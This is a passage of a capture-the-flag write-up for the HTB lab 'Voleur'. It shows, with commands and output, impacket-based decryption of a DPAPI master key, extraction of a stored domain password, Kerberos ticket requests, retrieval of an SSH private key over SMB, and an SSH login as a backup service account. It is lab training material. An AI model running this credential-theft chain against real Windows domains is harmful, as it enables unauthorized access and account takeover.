</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/hexhunter404/Downloads<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# impacket-dpapi masterkey -file  08949382-134f-4c63-b93c-ce52efc0aa88 -password NightT1meP1dg3on14 -sid S-1-5-21-3927696377-1337352550-2781715495-1110
</span></span><span style="display:flex;"><span>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>MASTERKEYFILE<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Version     :        <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
</span></span><span style="display:flex;"><span>Flags       :        <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Policy      :        <span style="color:#ae81ff">0</span> <span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>MasterKeyLen: <span style="color:#ae81ff">00000088</span> <span style="color:#f92672">(</span>136<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>BackupKeyLen: <span style="color:#ae81ff">00000068</span> <span style="color:#f92672">(</span>104<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>CredHistLen : <span style="color:#ae81ff">00000000</span> <span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>DomainKeyLen: <span style="color:#ae81ff">00000174</span> <span style="color:#f92672">(</span>372<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Decrypted key with User Key <span style="color:#f92672">(</span>MD4 protected<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
</span></span></code></pre></td></tr></table>
</div>
</div><p>The DPAPI master key decryption process required the user&rsquo;s password (NightT1meP1dg3on14) and Security Identifier (SID).</p>
<p><strong>Master Key:</strong> 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83</p>
<p><strong>4.6 Credential Extraction</strong></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/hexhunter404/Downloads<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83 
</span></span><span style="display:flex;"><span>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>CREDENTIAL<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>LastWritten : 2025-01-29 12:55:19+00:00
</span></span><span style="display:flex;"><span>Flags       : 0x00000030 <span style="color:#f92672">(</span>CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Persist     : 0x00000003 <span style="color:#f92672">(</span>CRED_PERSIST_ENTERPRISE<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Type        : 0x00000002 <span style="color:#f92672">(</span>CRED_TYPE_DOMAIN_PASSWORD<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Target      : Domain:target<span style="color:#f92672">=</span>Jezzas_Account
</span></span><span style="display:flex;"><span>Description : 
</span></span><span style="display:flex;"><span>Unknown     : 
</span></span><span style="display:flex;"><span>Username    : jeremy.combs
</span></span><span style="display:flex;"><span>Unknown     : qT3V9pLXyN7W4m
</span></span></code></pre></td></tr></table>
</div>
</div><p>The credential extraction phase utilized the decrypted master key to recover stored Windows credentials. This attack vector highlights the risk of Windows&rsquo; credential caching mechanisms, which are designed for user convenience but can be exploited by attackers with appropriate access.</p>
<p><strong>Credentials Discovered:</strong></p>
<ul>
<li><strong>Username:</strong> jeremy.combs</li>
<li><strong>Password:</strong> qT3V9pLXyN7W4m</li>
<li><strong>Target:</strong> Domain:target=Jezzas_Account</li>
</ul>
<p>The recovered credentials for jeremy.combs provided access to a higher-privileged user account, likely with access to additional resources and systems within the domain.</p>
<p><img src="/images/writeups/htb/voleur/jeremy_combs.png" alt="Jeremy Combs on BloodHound"></p>
<hr>
<h2 id="phase-5-wslssh-access"><strong>Phase 5: WSL/SSH Access</strong><a href="#phase-5-wslssh-access" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p><strong>5.1 Third-Line Support Access</strong></p>
<p>The escalation to jeremy.combs credentials provided access to the Third-Line Support folder, representing the highest tier of technical support within the organization. This folder contained sensitive administrative tools and documentation, including SSH private keys for system access.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Get TGT for jeremy.combs</span>
</span></span><span style="display:flex;"><span>impacket-getTGT voleur.htb/jeremy.combs:qT3V9pLXyN7W4m
</span></span><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>/home/hexhunter404/Downloads/jeremy.combs.ccache
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/hexhunter404/Downloads<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# ntpdate voleur.htb <span style="color:#f92672">&amp;&amp;</span> impacket-smbclient -k <span style="color:#e6db74">&#39;voleur.htb/jeremy.combs@dc.voleur.htb&#39;</span> -no-pass             
</span></span><span style="display:flex;"><span>2025-07-06 22:37:50.849882 <span style="color:#f92672">(</span>+0200<span style="color:#f92672">)</span> +28799.951925 +/- 0.012317 voleur.htb 10.129.196.199 s1 no-leap
</span></span><span style="display:flex;"><span>CLOCK: time stepped by 28799.951925
</span></span><span style="display:flex;"><span>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Type help <span style="color:#66d9ef">for</span> list of commands
</span></span><span style="display:flex;"><span><span style="color:#75715e"># use IT</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># cd Third-Line Support</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ls</span>
</span></span><span style="display:flex;"><span>drw-rw-rw-          <span style="color:#ae81ff">0</span>  Thu Jan <span style="color:#ae81ff">30</span> 17:11:29 <span style="color:#ae81ff">2025</span> .
</span></span><span style="display:flex;"><span>drw-rw-rw-          <span style="color:#ae81ff">0</span>  Wed Jan <span style="color:#ae81ff">29</span> 10:10:01 <span style="color:#ae81ff">2025</span> ..
</span></span><span style="display:flex;"><span>-rw-rw-rw-       <span style="color:#ae81ff">2602</span>  Thu Jan <span style="color:#ae81ff">30</span> 17:11:29 <span style="color:#ae81ff">2025</span> id_rsa
</span></span><span style="display:flex;"><span>-rw-rw-rw-        <span style="color:#ae81ff">186</span>  Thu Jan <span style="color:#ae81ff">30</span> 17:07:35 <span style="color:#ae81ff">2025</span> Note.txt.txt
</span></span><span style="display:flex;"><span><span style="color:#75715e"># get Note.txt.txt</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># get id_rsa</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># exit</span>
</span></span><span style="display:flex;"><span>                                                                                                                                                                                                                                       
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/hexhunter404/Downloads<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# cat Note.txt.txt                                                       
</span></span><span style="display:flex;"><span>Jeremy,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>I<span style="color:#e6db74">&#39;ve had enough of Windows Backup! I&#39;</span>ve part configured WSL to see <span style="color:#66d9ef">if</span> we can utilize any of the backup tools from Linux.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Please see what you can set up.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Thanks,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Admin
</span></span></code></pre></td></tr></table>
</div>
</div><p>But there’s still an interesting folder Backups that even jeremy.combs cannot access</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\T</span>hird-Line Support&gt; cd Backups
</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\T</span>hird-Line Support<span style="color:#ae81ff">\B</span>ackups&gt; dir
</span></span><span style="display:flex;"><span>Access to the path <span style="color:#e6db74">&#39;C:\IT\Third-Line Support\Backups&#39;</span> is denied.
</span></span><span style="display:flex;"><span>At line:1 char:1
</span></span><span style="display:flex;"><span>+ dir
</span></span><span style="display:flex;"><span>+ ~~~
</span></span><span style="display:flex;"><span>    + CategoryInfo          : PermissionDenied: <span style="color:#f92672">(</span>C:<span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\T</span>hird-Line Support<span style="color:#ae81ff">\B</span>ackups:String<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Get-ChildItem<span style="color:#f92672">]</span>, UnauthorizedAccessException
</span></span><span style="display:flex;"><span>    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>5.2 SSH Key Analysis</strong></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/hexhunter404/Downloads<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# ssh-keygen -l -f id_rsa
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3072</span> SHA256:+SJo12eqmKss6G70Hv3/wPrD2rXK9QY7fg8uUrxUeUw svc_backup@DC <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>                                                                                       
</span></span></code></pre></td></tr></table>
</div>
</div><p>The SSH key analysis revealed that the private key belonged to the svc_backup account on the domain controller. This discovery connected the unusual SSH service on port 2222 to the backup service account, suggesting a Linux subsystem used for backup operations.</p>
<p><strong>Key Identity:</strong> svc_backup@DC (RSA)</p>
<p><strong>5.3 WSL Access</strong></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>                                                                                                                                                   
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/hexhunter404/Downloads<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# ssh -i id_rsa -p <span style="color:#ae81ff">2222</span> svc_backup@10.129.196.199
